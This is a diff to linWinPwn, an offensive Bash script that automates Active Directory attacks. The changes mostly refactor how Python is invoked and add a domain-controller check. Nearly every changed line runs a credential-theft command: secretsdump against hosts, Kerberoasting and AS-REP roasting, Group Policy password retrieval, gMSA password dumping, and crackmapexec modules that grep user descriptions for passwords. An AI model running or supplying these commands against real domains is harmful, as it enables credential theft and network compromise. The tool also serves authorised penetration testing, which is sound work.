@@ -3,7 +3,7 @@
 # linWinPwn - alpha version (https://github.com/lefayjey/linWinPwn)
 # Author: lefayjey
 # Inspired by: S3cur3Th1sSh1t's WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
-# Latest update : 28/01/2022
+# Latest update : 31/01/2022
 #
 #      _        __        ___       ____                 
 #     | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __  
@@ -33,6 +33,7 @@ users_list="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
 lsassy_bool=true
 
 #Tools variables
+python=$(which python3)
 impacket_dir="/usr/local/bin"
 bloodhound=$(which bloodhound-python)
 ldapdomaindump=$(which ldapdomaindump)
@@ -122,10 +123,12 @@ prepare (){
     dc_domain=$(echo $dc_info | cut -d ":" -f 3 | sed "s/) (signing//g"| head -n 1)
     dc_FQDN=${dc_NETBIOS}"."${dc_domain}
 
-    if [ -z "$domain" ] ; then
+    if [ -z "$dc_domain" ] ; then
+        echo -e "${RED}[-] Please ensure the target is a Domain Controller and try again... ${NC}"
+        exit 1
+    elif [ -z "$domain" ] ; then
         domain=${dc_domain}
     fi
-
 
     anon_bool=false
     hash_bool=false
@@ -162,6 +165,8 @@ prepare (){
     echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${dc_FQDN}"
     echo -e "${YELLOW}[i]${NC} Running modules: ${modules}"
     echo -e ""
+
+    output_dir="${output_dir}/linWinPwn_$(date +%Y-%m-%dT%T)"
     mkdir -p ${output_dir}/DomainRecon/BloodHound
     mkdir -p ${output_dir}/DomainRecon/LDAPDump
     mkdir -p ${output_dir}/Kerberoast
@@ -377,7 +382,6 @@ ad_enum () {
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M adcs --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_adcs_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] users description dump ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M get-desc-users --kdcHost ${dc_domain} | grep -i "pass" | tee ${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
-            
             echo -e "${CYAN}[*] get MachineAccountQuota ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M MAQ --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] ldap-signing check ${NC}"
@@ -441,14 +445,14 @@ ad_enum () {
         if [ "${anon_bool}" == true ] ; then
             echo -e "${PURPLE}[-] impacket requires credentials${NC}"
         elif [ "${hash_bool}" == true ] ; then 
-            /usr/bin/python3 ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}@${dc_ip} -hashes ${hash} | tee ${output_dir}/DomainRecon/impacket_Get-GPPPassword_output_${dc_domain}.txt
-            /usr/bin/python3 ${impacket_dir}/findDelegation.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}@${dc_ip} -hashes ${hash} | tee ${output_dir}/DomainRecon/impacket_Get-GPPPassword_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/findDelegation.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
         elif [ "${kerb_bool}" == true ] ; then
-            /usr/bin/python3 ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}@${dc_ip} -k -no-pass | tee ${output_dir}/DomainRecon/impacket_Get-GPPPassword_output_${dc_domain}.txt
-            /usr/bin/python3 ${impacket_dir}/findDelegation.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}@${dc_ip} -k -no-pass | tee ${output_dir}/DomainRecon/impacket_Get-GPPPassword_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/findDelegation.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
         else
-            /usr/bin/python3 ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}:${password}@${dc_ip} | tee ${output_dir}/DomainRecon/impacket_Get-GPPPassword_output_${dc_domain}.txt
-            /usr/bin/python3 ${impacket_dir}/findDelegation.py ${domain}/${user}:${password} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}:${password}@${dc_ip} | tee ${output_dir}/DomainRecon/impacket_Get-GPPPassword_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/findDelegation.py ${domain}/${user}:${password} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
         fi
         if [ "${anon_bool}" == false ] ; then
             if grep -q 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt; then
@@ -465,11 +469,11 @@ ad_enum () {
         if [ "${anon_bool}" == true ] ; then
             echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
         elif [ "${hash_bool}" == true ] ; then 
-            /usr/bin/python3 ${scripts_dir}/gMSADumper.py -d ${domain} -u ${user} -p ${hash} -l ${dc_ip} 2>/dev/null > ${output_dir}/DomainRecon/gMSA_dump_${dc_domain}.txt
+            ${python} ${scripts_dir}/gMSADumper.py -d ${domain} -u ${user} -p ${hash} -l ${dc_ip} 2>/dev/null > ${output_dir}/DomainRecon/gMSA_dump_${dc_domain}.txt
         elif [ "${kerb_bool}" == true ] ; then
-            /usr/bin/python3 ${scripts_dir}/gMSADumper.py -d ${domain} -u ${user} -k 2>/dev/null > ${output_dir}/DomainRecon/gMSA_dump_${dc_domain}.txt
+            ${python} ${scripts_dir}/gMSADumper.py -d ${domain} -u ${user} -k 2>/dev/null > ${output_dir}/DomainRecon/gMSA_dump_${dc_domain}.txt
         else
-            /usr/bin/python3 ${scripts_dir}/gMSADumper.py -d ${domain} -u ${user} -p ${password} -l ${dc_ip} 2>/dev/null > ${output_dir}/DomainRecon/gMSA_dump_${dc_domain}.txt
+            ${python} ${scripts_dir}/gMSADumper.py -d ${domain} -u ${user} -p ${password} -l ${dc_ip} 2>/dev/null > ${output_dir}/DomainRecon/gMSA_dump_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -479,13 +483,13 @@ ad_enum () {
         echo -e "${RED}[-] Please verify the location of LdapRelayScan.py${NC}"
     else
         if [ "${anon_bool}" == true ] ; then
-            /usr/bin/python3 ${scripts_dir}/LdapRelayScan.py -method LDAPS -dc-ip ${dc_ip} 2>/dev/null > ${output_dir}/DomainRecon/LdapRelayScan_${dc_domain}.txt
+            ${python} ${scripts_dir}/LdapRelayScan.py -method LDAPS -dc-ip ${dc_ip} 2>/dev/null > ${output_dir}/DomainRecon/LdapRelayScan_${dc_domain}.txt
         elif [ "${hash_bool}" == true ] ; then 
-            /usr/bin/python3 ${scripts_dir}/LdapRelayScan.py -method BOTH -dc-ip ${dc_ip} -u ${user} -nthash $(echo ${hash} | cut -d ":" -f 2) 2>/dev/null > ${output_dir}/DomainRecon/LdapRelayScan_${dc_domain}.txt
+            ${python} ${scripts_dir}/LdapRelayScan.py -method BOTH -dc-ip ${dc_ip} -u ${user} -nthash $(echo ${hash} | cut -d ":" -f 2) 2>/dev/null > ${output_dir}/DomainRecon/LdapRelayScan_${dc_domain}.txt
         elif [ "${kerb_bool}" == true ] ; then
             echo -e "${PURPLE}[-] LdapRelayScan does not support kerberos tickets${NC}"
         else
-            /usr/bin/python3 ${scripts_dir}/LdapRelayScan.py -method BOTH -dc-ip ${dc_ip} -u ${user} -p ${password} 2>/dev/null > ${output_dir}/DomainRecon/LdapRelayScan_${dc_domain}.txt
+            ${python} ${scripts_dir}/LdapRelayScan.py -method BOTH -dc-ip ${dc_ip} -u ${user} -p ${password} 2>/dev/null > ${output_dir}/DomainRecon/LdapRelayScan_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -493,17 +497,17 @@ ad_enum () {
     echo -e "${BLUE}[*] certipy enum${NC}"
     if [[ ! -f "${certipy}" ]] && [[ ! -f "${impacket_dir}/getTGT.py)" ]] ; then
         echo -e "${RED}[-] Please verify the installation of certipy${NC}"
+    elif [ "${anon_bool}" == true ] ; then
+        echo -e "${PURPLE}[-] certipy requires credentials${NC}"
     else
         current_dir=$(pwd)
         cd ${output_dir}
-        if [ "${anon_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] impacket requires credentials${NC}"
-        elif [ "${hash_bool}" == true ] ; then
-            /usr/bin/python3 ${impacket_dir}/getTGT.py ${domain}/${user} -dc-ip ${dc_ip} -hashes ${hash}
+        if [ "${hash_bool}" == true ] ; then
+            ${python} ${impacket_dir}/getTGT.py ${domain}/${user} -dc-ip ${dc_ip} -hashes ${hash}
         elif [ "${kerb_bool}" == true ] ; then
-            /usr/bin/python3 ${impacket_dir}/getTGT.py ${domain}/${user} -dc-ip ${dc_ip} -k -no-pass 
+            ${python} ${impacket_dir}/getTGT.py ${domain}/${user} -dc-ip ${dc_ip} -k -no-pass 
         else
-            /usr/bin/python3 ${impacket_dir}getTGT.py ${domain}/${user}:${password} -dc-ip ${dc_ip}
+            ${python} ${impacket_dir}getTGT.py ${domain}/${user}:${password} -dc-ip ${dc_ip}
         fi
         cd ${current_dir}
         export KRB5CCNAME="${output_dir}/${user}.ccache"
@@ -537,16 +541,16 @@ kerberos () {
             if [ -s "${known_users_list}" ] ; then
                 users_list=${known_users_list}
             fi
-            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${dc_domain}/ -usersfile ${users_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt 2>&1
+            ${python} ${impacket_dir}/GetNPUsers.py ${dc_domain}/ -usersfile ${users_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt 2>&1
         elif [ "${hash_bool}" == true ] ; then
-            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip}
-            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip}
+            ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
         elif [ "${kerb_bool}" == true ] ; then
-            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip}
-            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip}
+            ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
         else
-            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user}:${password} -dc-ip ${dc_ip}
-            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user}:${password} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user}:${password} -dc-ip ${dc_ip}
+            ${python} ${impacket_dir}/GetNPUsers.py ${domain}/${user}:${password} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
         fi
 
         if grep -q 'error' ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt; then
@@ -564,14 +568,14 @@ kerberos () {
         if [ "${anon_bool}" == true ] ; then
             echo -e "${PURPLE}[-] Kerberoast requires credentials${NC}"
         elif [ "${hash_bool}" == true ] ; then
-            /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip} -target-domain ${dc_domain}
-            /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip} -target-domain ${dc_domain}
+            ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt
         elif [ "${kerb_bool}" == true ] ; then
-            /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip} -target-domain ${dc_domain}
-            /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip} -target-domain ${dc_domain}
+            ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt
         else
-            /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user}:${password} -dc-ip ${dc_ip} -target-domain ${dc_domain}
-            /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user}:${password} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt
+            ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user}:${password} -dc-ip ${dc_ip} -target-domain ${dc_domain}
+            ${python} ${impacket_dir}/GetUserSPNs.py ${domain}/${user}:${password} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt
         fi
         if [ "${anon_bool}" == false ] ; then
             if grep -q 'error' ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt; then
@@ -725,11 +729,11 @@ pwd_dump () {
                 echo -e "${PURPLE}[-] secretsdump requires credentials${NC}"
                 break
             elif [ "${hash_bool}" == true ] ; then
-                /usr/bin/python3 ${impacket_dir}/secretsdump.py ${domain}/${user}@${i} -hashes ${hash} > ${output_dir}/Credentials/secrets_dump_${dc_domain}_${i}.txt 2>&1
+                ${python} ${impacket_dir}/secretsdump.py ${domain}/${user}@${i} -hashes ${hash} > ${output_dir}/Credentials/secrets_dump_${dc_domain}_${i}.txt 2>&1
             elif [ "${kerb_bool}" == true ] ; then
-                /usr/bin/python3 ${impacket_dir}/secretsdump.py -k -no-pass ${domain}/${user}@${i} > ${output_dir}/Credentials/secrets_dump_${dc_domain}_${i}.txt 2>&1
+                ${python} ${impacket_dir}/secretsdump.py -k -no-pass ${domain}/${user}@${i} > ${output_dir}/Credentials/secrets_dump_${dc_domain}_${i}.txt 2>&1
             else
-                /usr/bin/python3 ${impacket_dir}/secretsdump.py ${domain}/${user}:${password}@${i} > ${output_dir}/Credentials/secrets_dump_${dc_domain}_${i}.txt 2>&1
+                ${python} ${impacket_dir}/secretsdump.py ${domain}/${user}:${password}@${i} > ${output_dir}/Credentials/secrets_dump_${dc_domain}_${i}.txt 2>&1
             fi
             
             if grep -qi 'error' ${output_dir}/Credentials/secrets_dump_${dc_domain}_${i}.txt; then
